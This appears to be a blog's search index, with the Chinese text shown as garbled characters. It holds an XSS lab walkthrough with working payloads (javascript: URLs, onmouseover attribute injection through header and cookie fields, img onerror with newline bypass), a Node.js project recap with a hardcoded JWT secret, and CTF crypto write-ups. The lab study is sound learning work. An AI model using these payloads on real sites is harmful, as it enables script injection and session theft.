href=\"æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\"\u003eï¼Œçœ‹çœ‹æºç  $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','\u0026quot',$str6); false===strpos($str7,'http://') ä¸ä¸Šä¸€é¢˜ä¸åŒçš„å°±æ˜¯æ·»åŠ äº†å¯¹httpçš„éªŒè¯,æˆ‘ä»¬åœ¨åé¢åŠ ä¸Šæ³¨é‡Šï¼Œå†™ä¸Šhttp://å°±è¡Œäº† javascr\u0026#x69;pt:alert(1)//http:// ","date":"2025-05-09","objectID":"/study_xss/:6:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level10~16(å­—æ®µæ³¨å…¥) level10 å°è¯•è€payloadï¼Œå‘ç°æ— ç‰¹åˆ«å›æ˜¾ï¼Œçœ‹çœ‹æºç  ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str11 = $_GET[\"t_sort\"]; $str22=str_replace(\"\u003e\",\"\",$str11); $str33=str_replace(\"\u003c\",\"\",$str22); \u003cform id=search\u003e \u003cinput name=\"t_link\" value=\"'.'\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"'.'\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"\u003e \u003c/form\u003e å°è¯•æ‰€æœ‰å†…å®¹è¾“å…¥http://localhost:51142/level10.php?keyword=test?t_link=tlink\u0026t_history=thistory\u0026t_sort=tsort ï¼Œå¾—åˆ° \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"tsort\" type=\"hidden\"\u003e t_sortçš„ä¿¡æ¯å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥å°è¯•ä»è¿™é‡Œæ³¨å…¥ï¼Œä»æºç å¾—çŸ¥\u003c\u003eè¢«è¿‡æ»¤æ‰ï¼Œå°è¯•ç±»ä¼¼\" onmouseover=javascript:alert(1) \"çš„payload http://localhost:51142/level10.php?keyword=test\u0026t_sort=\" onmouseover=javascript:alert(1) \" å‘ç°å›æ˜¾ \u003cinput name=\"t_sort\" value=\"\" onmouseover=javascript:alert(1) \"\" type=\"hidden\"\u003e ,è¢«éšè—äº†xdï¼Œhtmlé‡Œé¢åŠ ä¸€ä¸ªtypeå»è¦†ç›–è¿™ä¸ªçŠ¶æ€ http://localhost:51142/level10.php?keyword=test\u0026t_sort=\" onmouseover=javascript:alert(1) type \" level11 çœ‹é¡µé¢æºç  \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_ref\" value=\"http://localhost:51142/level10.php?keyword=test\u0026t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22\" type=\"hidden\"\u003e å‘ç°refererè¢«ä¼ å›æ¥ï¼Œæ˜¯ä¸Šä¸€ä¸ªé¶åœºçš„é“¾æ¥ï¼ŒbpæŠ“åŒ…ç»™ä»–æ”¹äº†ä¼ å›å» Referer: \"type=\"text \"onmousemove=\"alert(1) è¿˜æœ‰ä¸€ç§æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º \" onmouseover=javascript:alert(1) type \".html çš„ HTML æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­é‡å®šå‘åˆ° level 11 çš„é¡µé¢ã€‚ level12 çœ‹çœ‹é¡µé¢æºç  \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_ua\" value=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15\" type=\"hidden\"\u003e ç»™äº†uaï¼Œå¾ˆæ˜æ˜¾ä¸¾è¦æ”¹uaï¼Œæ”¹æˆ\"type=\"text \"onmousemove=\"alert(1)å°±è¡Œ level13 ä¿®æ”¹cookieä¸º\" onmouseover=javascript:alert(1) type \" level14 è²Œä¼¼è¿™ä¸ªå…³å¡å¯„äº†ï¼Œçœ‹åˆ«äººçš„åšå®¢è²Œä¼¼æ˜¯exif xssï¼Œå°±æ˜¯å›¾ç‰‡ä¸Šä¼ ï¼Œå›¾ç‰‡çš„å±æ€§æ”¹æˆxssçš„é©¬ level15 è¿™ä¸€å…³è€ƒçš„æ˜¯ng-include:è¿™ä¸ªä¸œè¥¿ï¼Œæ–‡ä»¶åŒ…å« ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚ åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ è¯­æ³• \u003celement ng-include=\"filename\" onload=\"expression\" autoscroll=\"expression\" \u003e\u003c/element\u003e ç¬¬ä¸€ç§åšæ³•ï¼ŒæŠŠä»¥å‰å…³å¡çš„æ¼æ´åŒ…å«è¿›å»ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰“äº† ç¬¬äºŒç§æ–¹æ³•ï¼Œå†™ä¸€ä¸ªèƒ½å¤Ÿå¼¹çª—çš„ç®€å• HTMLï¼Œç„¶å include è¿›æ¥ \u003chtml\u003e \u003ch1\u003ehacker\u003c/h1\u003e \u003cimg src=1 onerror=\"alert(1)\"\u003e\u003c/img\u003e \u003c/html\u003e å¦‚æœæ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ï¼Œå°±æ˜¯?src=\"/alert.html\" æ„Ÿè§‰è¿™ç§é‡åˆ°çš„å¯èƒ½æ€§å¾ˆå° level16 çœ‹ä¸‹é¢æºç  $str2=str_replace(\"script\",\"\u0026nbsp;\",$str); $str3=str_replace(\" \",\"\u0026nbsp;\",$str2); $str4=str_replace(\"/\",\"\u0026nbsp;\",$str3); $str5=str_replace(\" \",\"\u0026nbsp;\",$str4); è¿˜æ˜¯è¿‡æ»¤ç±»å‹çš„ï¼Œç©ºæ ¼å’Œsrciptéƒ½æ²¡äº†ï¼Œä¸»è¦æ˜¯ç©ºæ ¼ï¼Œhtmlé‡Œé¢æ¢è¡Œç¬¦å¯ä»¥æ›¿æ¢æ‰ç©ºæ ¼ï¼Œ%0A http://localhost:51142/level16.php?keyword=\u003cimg%0Asrc=1%0Aonerror=\"alert(1)\"\u003e ","date":"2025-05-09","objectID":"/study_xss/:6:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["nodejs"],"content":"å‰è¨€ äº”ä¸€é—²æ¥æ— äº‹ï¼Œä¹Ÿä¸æ˜¯ç‰¹åˆ«æƒ³æ‰“ctfï¼Œå•§ï¼Œæœ€è¿‘æ„Ÿè§‰æ‰“ctfçš„ä½“éªŒè¶Šæ¥è¶Šä¸å¯¹äº†ï¼Œçƒ­çˆ±å¥½åƒå˜è´¨äº†ï¼Ÿæ“ä¸ªé¡¹ç›®ç©å§ã€‚åœ¨è¿™é‡Œå¤ç›˜ä¸€ä¸‹ ","date":"2025-05-04","objectID":"/about51/:1:0","tags":["å¼€å‘"],"title":"äº”ä¸€é•¿å‡vue3+nodejså…¨æ ˆé¡¹ç›®å¤ç›˜","uri":"/about51/"},{"categories":["nodejs"],"content":"æ•´ä½“æ¡†æ¶ å‰ç«¯vue3ï¼Œå¥½ä¹…æ²¡æ“vueäº†ï¼Œè¿˜æŒºæ€€å¿µå»å¹´æš‘å‡å­¦vueçš„ã€‚ åç«¯nodejs+expresï¼Œæœ¬æ¥æƒ³ç”¨fastifyï¼Œä½†æ˜¯æŒæ¡åº¦ä¸é«˜ï¼Œè¿˜æ˜¯ç¨³ä¸€ç‚¹å§ï¼Œåˆ«ç»™è‡ªå·±å†™æ¶å¿ƒäº†ã€‚ é¡¹ç›®æŒºè€å¥—çš„ï¼Œæ–°é—»+äº§å“ç®¡ç†/å‘å¸ƒé¡¹ç›®ï¼Œä¸¤å¥—å‰ç«¯(admin\u0026web)ï¼Œä¸€ä¸ªåç«¯(server)ã€‚ç®¡ç†åˆåˆ†ä¸ºç®¡ç†å‘˜å’Œç¼–è¾‘å‘˜ã€‚ ","date":"2025-05-04","objectID":"/about51/:2:0","tags":["å¼€å‘"],"title":"äº”ä¸€é•¿å‡vue3+nodejså…¨æ ˆé¡¹ç›®å¤ç›˜","uri":"/about51/"},{"categories":["nodejs"],"content":"å‰ç«¯ åˆæœŸé…ç½® vue create adminåˆ›å»ºåå°ç®¡ç†é¡¹ç›®ï¼Œåœ¨8080ç«¯å£è¿è¡Œ vue create webåˆ›å»ºä¼ä¸šé—¨æˆ·é¡µé¢ï¼Œåœ¨8081ç«¯å£è¿è¡Œ å› ä¸ºç”¨çš„ä¸€å¥—åç«¯åœ¨3000ç«¯å£ï¼Œä¸Šæ¥ç›´æ¥é…ç½®vue.config.jsï¼Œåˆ©ç”¨åå‘ä»£ç†å’Œåç«¯é€šè®¯ const { defineConfig } = require('@vue/cli-service') module.exports = defineConfig({ transpileDependencies: true, devServer: { proxy: { \"apié˜¿å·´é˜¿å·´\": { target: \"http://localhost:3000\", changeOrigin: true } } } }) ä¸è¿‡è®©æˆ‘æœ€å¥½å¥‡çš„ä»–è¿™ä¸ªå±…ç„¶ä¸æ˜¯es6å†™æ³• æ¨¡æ¿ç»„ä»¶ ä¸ºäº†å‰ç«¯ä¸é‚£ä¹ˆä¸‘ï¼Œæˆ‘å¤§é‡ä½¿ç”¨äº†element-plusçš„ç»„ä»¶ï¼Œä½¿ç”¨æ–¹æ³•ç…§æŠ„å®˜ç½‘çš„å°±è¡Œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å‚æ•°è°ƒæ•´å’Œè‡ªå·±çµæ´»åº”ç”¨ç»„ä»¶ å…³äºæ—¶é—´å¤„ç† æ—¶é—´è§„èŒƒåŒ–å¤„ç†å¯ä»¥ä½¿ç”¨momentï¼Œå¯ä»¥å‚è€ƒä»–ä»¬çš„å®˜æ–¹æ–‡æ¡£ï¼Œä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯ import moment from 'moment' moment.locale(\"zh-cn\"); const formatTime = { getTime: (data) =\u003e { return moment(data).format('YYYY/MM/DD') } } export default formatTime å…³äºæ–‡ä»¶ä¸Šä¼  å› ä¸ºä¼ æ–°é—»å’Œäº§å“çš„æ—¶å€™æ€»ä¼šç”¨åˆ°çš„ï¼Œè™½ç„¶å†™å¥½ä¸€ä¸ªå¤åˆ¶ç²˜è´´è¿‡å»å°±è¡Œï¼Œä½†æ˜¯åˆé•¿åˆè‡­éå¸¸çš„å½±å“æˆ‘å¿ƒæƒ…ï¼Œè¿™ç§æ—¶å€™å¯ä»¥åˆ©ç”¨å°è£…çš„æ€æƒ³ï¼ŒæŠŠè¿™ä¸ªå•ç‹¬å°è£…æˆä¸€ä¸ªç»„ä»¶å»ä½¿ç”¨ å…³äºè·¯ç”±é…ç½® è·¯ç”±é…ç½®åˆéº»çƒ¦åˆç®€å•çš„ï¼Œåˆ›å»ºçš„æ—¶å€™å°±æœ‰ä¸€ä¸ªrouter/index.jsï¼Œå› ä¸ºadminé¡¹ç›®çš„å·¦ä¾§æ ä¼šæ”¾å¾ˆå¤šçš„å­é€‰é¡¹ï¼Œå°±ä¼šåŠ ä¸€å †è·¯ç”±ï¼Œç”¨å­è·¯ç”±å®ç°æ˜¯åˆç†çš„ï¼Œä½†æ˜¯å°±ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚æƒé™æ€§é—®é¢˜ï¼Œæˆ‘åˆä¸æƒ³åœ¨åç«¯å®ç°ï¼Œæ‰€ä»¥æˆ‘ä¸“é—¨å†™äº†ä¸ªrouter/config.jså»å®ç°åŠ¨æ€è·¯ç”±ï¼Œå¹¶åœ¨é‡Œé¢å®ç°æƒé™ç®¡ç†requireAdminï¼Œæ„Ÿè§‰æ¯”è¾ƒç®€é™‹ï¼Œå°±æ˜¯å¯¹ç¼–è¾‘å‘˜éšè—è¿™ä¸ªè·¯ç”± å…³äºæ‹¦æˆªå™¨ è¿™é‡Œç›´æ¥ä½¿ç”¨axiosï¼Œç›´æ¥æŠŠå®˜ç½‘çš„æ‹‰è¿‡æ¥ç”¨äº†ï¼Œå†™äº†ä¸ªutil/axios.config.jsï¼Œå»å®ç°æ‹¦æˆªå™¨ å…³äºå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ ç°åœ¨ç”¨çš„è¿˜æ˜¯wangeditorçš„v4ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºå¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥å¯¼å…¥ï¼Œä¸åƒv5éœ€è¦è‡ªå·±å†é‡æ–°é…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯è¿‡æ—¶äº†ï¼Œåé¢å†æ¢æˆv5æˆ–è€…æ˜¯å…¶ä»–çš„markdownç¼–è¾‘å™¨å§ï¼Œå’•å’•å’• å…³äºæ ·å¼ ç»å…¸å¸¸ç”¨\u003cstyle lang=\"scss\" scoped\u003e ï¼Œä½†æ˜¯å¦‚æœElement Plus çš„å­ç»„ä»¶ï¼Œå®ƒçš„ DOM ç»“æ„å¹¶ä¸åœ¨å½“å‰ç»„ä»¶çš„æ¨¡æ¿ä¸­ï¼Œæˆ‘å°±ä¸èƒ½åŠ æ•ˆæœäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨::v-deepå»ç©¿é€ï¼Œæ¯”å¦‚ .avatar-uploader .el-upload { ... } ç¼–è¯‘å .avatar-uploader .el-upload[data-v-xxxxxx] { ... } ::v-deep .avatar-uploader .el-upload { ... } ç¼–è¯‘å [data-v-xxxxxx] .avatar-uploader .el-upload { ... } è¿™æ ·å°±å¯ä»¥ä½œç”¨è¿›å»äº† ","date":"2025-05-04","objectID":"/about51/:2:1","tags":["å¼€å‘"],"title":"äº”ä¸€é•¿å‡vue3+nodejså…¨æ ˆé¡¹ç›®å¤ç›˜","uri":"/about51/"},{"categories":["nodejs"],"content":"åç«¯ åˆæœŸé…ç½® expressé»˜è®¤åˆ›å»ºæ—¶commonjsæ¨¡å¼ï¼Œä¸å–œæ¬¢ï¼Œå…ˆå…¨éƒ¨é‡æ„æˆes6ï¼Œå†è§„åˆ’ä¸€ä¸‹ ç»å…¸çš„nodejs+MVC.routesè·¯ç”±æ˜¯çº¯æ¥å£==\u003econtrollersæ•°æ®å¤„ç†=\u003emodelså±‚æ•°æ®æ“ä½œ==\u003eæ•°æ®åº“==\u003eè¿”å›æ•°æ® æ•°æ®åº“ è¿™é‡Œç”¨çš„mongoï¼Œnodejsé‡Œé¢ç”¨mongooseå»åˆ›å»ºæ¨¡å‹ï¼Œå¯è§†åŒ–ç”¨çš„æ˜¯vscçš„æ’ä»¶Database Client å…³äºtoken è¿™é‡Œä½¿ç”¨jsonwebtokenå»å®ç°ï¼Œæ–¹ä¾¿å¥½ç”¨æ”¾å¿ƒï¼ŒåŒæ—¶ç»“åˆå‰ç«¯çš„èº«ä»½åŒºåˆ†å»è¿›è¡Œå®Œå–„ï¼Œå› ä¸ºæ˜¯è‡ªå·±å†™çš„å°é¡¹ç›®ï¼Œkeyä¹Ÿå°±éšä¾¿è¾“å…¥äº†ä¸€ä¸ªå¸¸ç”¨çš„ï¼Œä¾‹å¦‚ import jsonwebtoken from 'jsonwebtoken' const secret = 'abab' export class JWT { generate(value, expries) { return jsonwebtoken.sign(value, secret, { expiresIn: expries }) } verify(token) { try { return jsonwebtoken.verify(token, secret) } catch (error) { return false } } } //éªŒè¯token app.use((req, res, next) =\u003e { //å¦‚æœtokenæœ‰æ•ˆï¼Œnext(),å¦‚æœæ— æ•ˆï¼Œè¿”å›401ç»™å‰ç«¯ if (req.url === '/adminapi/user/login') { next() return; } const token = req.headers[\"authorization\"].split(\" \")[1] if (token) { const payload = jwt.verify(token) if (payload) { const newToken = jwt.generate({ _id: payload._id, username: payload.username }, '1d') res.header(\"Authorization\", newToken) next() } else { res.status(401).send({ errCode: \"-1\", errorInfo: \"tokenè¿‡æœŸ\" }) } } }) å…³äºMVC\u0026æ•°æ®åº“ nodejsçš„MVCæ˜¯è¦è‡ªå·±æ‰‹åŠ¨å®ç°çš„ï¼Œå°±åƒä¸Šé¢æ‰€å†™çš„ä¸€æ ·ï¼Œéœ€è¦åˆ›å»ºä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«å»å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œè¿™ç‚¹å°±æ²¡springbootå¥½ã€‚ åŒæ—¶åˆ›å»ºä¹‹åï¼Œå†åœ¨ä¸‹é¢åˆ›å»ºadminå’Œwebæ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«å»å¤„ç†ç®¡ç†é¡µé¢å’Œé—¨æˆ·é¡µé¢ï¼Œä»¥å…å†™çš„apiå¤ªä¹±ã€‚ å…³äºæ•°æ®åº“æœ¬åœ°dockerå»æ­mangoå¹¶ä¸”å…³è”åˆ°dbè¿™ä¸ªæ–‡ä»¶å¤¹ï¼ŒåŒæ—¶ä¸€å¥—æ¨¡å‹å¯¹åº”ä¸¤å¥—å‰ç«¯ï¼Œæ–¹ä¾¿è°ƒç”¨ï¼Œä¹Ÿæ²¡æœ‰åŒæ­¥çš„é—®é¢˜ï¼Œæ¯”å¦‚ import mongoose from 'mongoose' const { Schema } = mongoose const NewsSchema = new Schema({ title: String, content: String, category: Number, // 123 cover: String, // å°é¢ isPublish: Number, // å‘å¸ƒçŠ¶æ€ editTime: Date, // ç¼–è¾‘æ—¶é—´ }) // æ³¨å†Œå¹¶å¯¼å‡ºæ¨¡å‹ const NewsModel = mongoose.model(\"news\", NewsSchema) export default NewsModel configæ–‡ä»¶é‡Œé¢å»å†™å…³äºæ•°æ®åº“çš„ä¸œè¥¿ import mongoose from \"mongoose\"; mongoose.connect(\"mongodb://127.0.0.1:27017/company-system\", { useNewUrlParser: true, useUnifiedTopology: true, }); const db = mongoose.connection; db.on(\"error\", (err) =\u003e { console.error(\"âŒ MongoDB connection error:\", err); }); db.once(\"open\", () =\u003e { console.log(\"âœ… MongoDB connected successfully!\"); }); export default db; é‚£ä¹ˆè¯¥å¦‚ä½•ä½¿ç”¨å‘¢ï¼Œserveræ–‡ä»¶å¤¹ä¸‹çš„ç›´æ¥å¯¹æ•°æ®åº“æ¨¡å‹è¿›è¡Œè°ƒç”¨ï¼Œåœ¨XXserver.jsé‡Œé¢å†™å…¥apiï¼Œæ¯”å¦‚ import NewsModel from '../../models/NewsModel.js' const NewsService = { add: async ({ title, content, category, isPublish, cover, editTime }) =\u003e { return NewsModel.create({ title, content, category, isPublish, cover, editTime }) }, getList: async ({ _id }) =\u003e { return _id ? NewsModel.find({ _id }) : NewsModel.find({}) }, publish: async ({ _id, isPublish, editTime }) =\u003e { return NewsModel.updateOne({ _id }, { isPublish, editTime }) }, delList: async ({ _id }) =\u003e { return NewsModel.deleteOne( { _id } ) }, updateList: async ({ _id, title, content, category, isPublish, cover, editTime }) =\u003e { if (cover) { return NewsModel.updateOne({ _id }, { title, content, category, isPublish, cover, editTime }) } else { return NewsModel.updateOne({ _id }, { title, content, category, isPublish, editTime }) } } } export default NewsService ç„¶åControlleræ–‡ä»¶å†å»è°ƒç”¨serveræ–‡ä»¶ï¼Œæœ€ååˆå¹¶åˆ°è·¯ç”±é‡Œé¢ï¼Œè¿™æ ·å°±ç®—æ˜¯å°è£…å¥½äº† ","date":"2025-05-04","objectID":"/about51/:2:2","tags":["å¼€å‘"],"title":"äº”ä¸€é•¿å‡vue3+nodejså…¨æ ˆé¡¹ç›®å¤ç›˜","uri":"/about51/"},{"categories":["nodejs"],"content":"ä¸ªäººæ„Ÿå— è¿™ä¸ªé¡¹ç›®å¾ˆç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»ƒæ‰‹çš„ï¼Œå‰åç«¯äº¤äº’å’Œè°ƒè¯•å äº†å¥½å¤šæ—¶é—´ï¼Œè¿˜æ˜¯å†™çš„å¤ªå°‘äº†ï¼Œå’Œå…¶ä»–çš„å¯¹æ¯”çš„è¯ï¼Œå’Œspringä¸åŒï¼Œnodejsè®©æˆ‘æ„Ÿè§‰æ›´åŠ ç»„ä»¶åŒ–ï¼Œä¸ªäººå†™çš„æ›´åŠ èˆ’æœå’Œäº«å—ã€‚ä½†æ˜¯ç°åœ¨å†™è¿›å»çš„ä¸œè¥¿å¤ªå°‘äº†ï¼Œæ¯”å¦‚å‰é¢studyç³»åˆ—çš„å•ç‚¹ç™»å½•ï¼Œormç­‰çŸ¥è¯†ç‚¹éƒ½æ²¡ç”¨ï¼Œå¹¶ä¸”å°é¡¹ç›®ä¹Ÿå‡¸æ˜¾ä¸å‡ºnodejsæœ€å¤§çš„ä¼˜åŠ¿ï¼Œåé¢å¯èƒ½ä¼šæ”¹å–„è¿™ä¸ªï¼ŒæŠŠè¿™ä¸ªå¤æ‚åŒ–ï¼ŒæŠ€æœ¯åŒ–ï¼Œæˆ–è€…æ˜¯ç›´æ¥å»å†™ä¸€ä¸ªæ›´å¤§çš„(æˆ–è€…æ˜¯å’•å’•å’•) ","date":"2025-05-04","objectID":"/about51/:3:0","tags":["å¼€å‘"],"title":"äº”ä¸€é•¿å‡vue3+nodejså…¨æ ˆé¡¹ç›®å¤ç›˜","uri":"/about51/"},{"categories":["é¶åœº"],"content":"ä¸»è¦é—®é¢˜ ","date":"2025-04-28","objectID":"/about_htb-thm/:1:0","tags":["æ¸—é€"],"title":"å…³äºHTB-THMè¿ä¸ä¸Š","uri":"/about_htb-thm/"},{"categories":["é¶åœº"],"content":"æ¢¯å­é…ç½® è¿™é‡Œæ˜¯macç³»ç»Ÿï¼Œlinuxåº”è¯¥æ˜¯ç±»ä¼¼çš„ï¼Œwinè‡ªå·±æŒ‚åˆ°linuxè™šæ‹Ÿæœºæˆ–è€…æ˜¯æ¢¯å­å¼€å±€åŸŸç½‘æ¨¡å¼å³å¯ clashorv2rayNéƒ½ä¼šæœ‰ä¸€ä¸ªç«¯å£å¼€æ”¾ï¼Œæˆ‘æ˜¯ç›´æ¥æš´éœ²å‡ºå»çš„ï¼Œè®°å¾—å¼€ç³»ç»Ÿä»£ç†å³å¯ ","date":"2025-04-28","objectID":"/about_htb-thm/:1:1","tags":["æ¸—é€"],"title":"å…³äºHTB-THMè¿ä¸ä¸Š","uri":"/about_htb-thm/"},{"categories":["é¶åœº"],"content":".ovpnæ–‡ä»¶ tcpä¸€èˆ¬éƒ½èƒ½è¿ä¸Šï¼Œä½†æ˜¯åªæœ‰htbçš„æœ‰ï¼Œè€Œä¸”htbçš„è”æœºæ¨¡å¼è¿˜ä¸æ˜¯tcp udpçš„é—®é¢˜ä¸€èˆ¬åœ¨äºè¿ä¸ä¸Šæˆ–è€…æ˜¯æœºåœºä¸æ”¯æŒï¼Œæœºåœºä¸æ”¯æŒæ¢ä¸€ä¸ªå°±å¥½äº† è¿ä¸ä¸Šçš„è¯åœ¨.ovpnæ–‡ä»¶åŠ å…¥ä¸€å¥socks-proxy 127.0.0.1 portï¼Œç«¯å£å°±æ˜¯æ¢¯å­çš„ç«¯å£ ","date":"2025-04-28","objectID":"/about_htb-thm/:1:2","tags":["æ¸—é€"],"title":"å…³äºHTB-THMè¿ä¸ä¸Š","uri":"/about_htb-thm/"},{"categories":["é¶åœº"],"content":"å…¶ä»–é—®é¢˜ å…¨æå¥½äº†è¿˜ä¸è¡Œï¼Ÿ macæ¨èç”¨orbstackï¼Œwinæ¨èç”¨wsl2ï¼Œéƒ½ç›´æ¥èµ°æœ¬æœºçš„ç¯å¢ƒï¼Œä¸ç”¨é¢å¤–é…ç½®ï¼Œç¼ºç‚¹æ˜¯æ²¡æœ‰ui éè¦è™šæ‹Ÿæœºçš„è¯ï¼Œé‡Œé¢ä¸‹ä¸ªæ¢¯å­é‡å¤ä¸Šé¢çš„æ“ä½œï¼Œä¸€èˆ¬éƒ½ä¸ä¼šæœ‰é—®é¢˜ å®åœ¨è§£å†³ä¸äº†ç›´æ¥é‡è£…ä¸€ä¸ªè™šæ‹Ÿæœºå¾—äº†xdï¼Œè¯´ä¸å®šæ˜¯ä½ ä»¥å‰æŠŠç¯å¢ƒç©åäº† ","date":"2025-04-28","objectID":"/about_htb-thm/:2:0","tags":["æ¸—é€"],"title":"å…³äºHTB-THMè¿ä¸ä¸Š","uri":"/about_htb-thm/"},{"categories":["CTF"],"content":"å‰è¨€ æœ€è¿‘æœŸä¸­è€ƒè¯•æ²¡æ€ä¹ˆåˆ·é¢˜æ¥ç€ï¼Œå¤ç°å¤ç°æ²¡å‚åŠ çš„æ¯”èµ›å§ï½ ","date":"2025-04-23","objectID":"/ny2025/:1:0","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-04-23","objectID":"/ny2025/:2:0","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"simpleSignin task.py from Crypto.Util.number import * from gmpy2 import * import os flag = b'xxx' p = next_prime(bytes_to_long(os.urandom(128))) q = next_prime(bytes_to_long(os.urandom(128))) r = next_prime(q) n = p * q * r e = 0x10001 print(f\"n = {n}\") print(f\"c = {pow(bytes_to_long(flag), e, n)}\") print(f\"gift1 = {p % (2**10)}\") print(f\"gift2 = {(p \u003e\u003e 20) % 2 ** 800}\") æ‹¿åˆ°é¢˜å°±çŸ¥é“è¿™ç©æ„æ˜¯copperï¼Œå¥½åƒæ¯”èµ›å½“å¤©è¿˜æœ‰äººåœ¨ç¾¤é‡Œé—®æ¥ç€ï¼Œæœ‰ç‚¹æ„æ€(ï¼Œç®€å•åˆ†æä¸€ä¸‹ gift1-\u003eä½10ä½ gift2-\u003eå³ç§»20ä½åçš„ä½800ä½ æˆ‘ä»¬å¯ä»¥è®¤ä¸ºå·²çŸ¥äº†ä½820ä½ï¼Œé‚£10ä½å¯ä»¥çˆ†ç ´ï¼Œé‚£ä¹ˆå‰é¢ç›´æ¥copperæ±‚å‡º exp.py n = c = gift1 = 513 gift2 = e=65537 from Crypto.Util.number import * PR.\u003cx\u003e = PolynomialRing(Zmod(n)) for i in range(2**10): p_low = (gift2\u003c\u003c20)+(i\u003c\u003c10)+gift1 f = x*2**820+p_low root = f.monic().small_roots(X=2^204,beta=0.33) if root: p = int(root[0]*2**820+p_low) if n%p==0: phi = p-1 d = inverse(e,phi) m = pow(c,d,p) flag=long_to_bytes(m) print(flag) break ","date":"2025-04-23","objectID":"/ny2025/:2:1","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"NumberTheory task.py from Crypto.Util.number import * import hint flag=b'xxx' e=65537 p=getPrime(512) q=getPrime(512) n=p*q m=bytes_to_long(flag) c=pow(m,e,n) k=getPrime(1024) assert hint + 233 * k == 233 * k * p print(n) print(c) print(hint) ç»å…¸æ•°è®ºé¢˜ $$ hint=233k(p-1) \\\\ a^{hint}=a^{233k(p-1)} \\mod p =1 \\mod p \\\\ p=\\gcd(a^{hint}-1,p) $$exp.py from Crypto.Util.number import * n= c= hint= e = 65537 p = GCD(pow(2,hint,n)-1,n) q = n//p phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) flag = long_to_bytes(m) print(flag) ","date":"2025-04-23","objectID":"/ny2025/:2:2","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"easy_lwe task.py from Crypto.Util.number import * from secrets import flag assert len(flag) == 38 p = getPrime(512) m = getPrime(512) while m \u003e p: m = getPrime(512) aa = [] cc = [] bb = [] for i in range(30): a = getPrime(512) b = getPrime(400) c = (a * m + b) % p aa.append(a) cc.append(c) bb.append(b) enc = pow(m,flag,p) print(f'p = {p}') print(f'aa = {aa}') print(f'cc = {cc}') print(f'enc = {enc}') part1æ˜¯hnpé—®é¢˜ï¼Œæ‰€ä»¥é¢˜ç›®ä¸ºä»€ä¹ˆå«lweï¼Ÿç›´æ¥ç”¨laä½¬çš„è„šæœ¬å°±è¡Œäº†ï¼Œå¾®å¾®æ”¹ä¸€ä¸‹ part2æ˜¯dlpé—®é¢˜ï¼Œp-1æ˜¯å¯åˆ†è§£çš„ï¼Œç»å…¸Pohlig-Hellmanï¼Œè¿™é‡Œå€Ÿé‰´å±±çŸ³çš„æ€è·¯ï¼Œæœ€åä¸€ä¸ªç´ æ•°ä¸ç”¨ï¼Œè€Œå»çˆ†ç ´æ±‚è§£ï¼Œæ•ˆç‡æ›´åŠ å¿« exp.py from Crypto.Util.number import * p = aa = enc = K = 2 ** 400 P = identity_matrix(30) * p RC = matrix([[-1, 0], [0, 1]]) * matrix([aa, cc]) KP = matrix([[K / p, 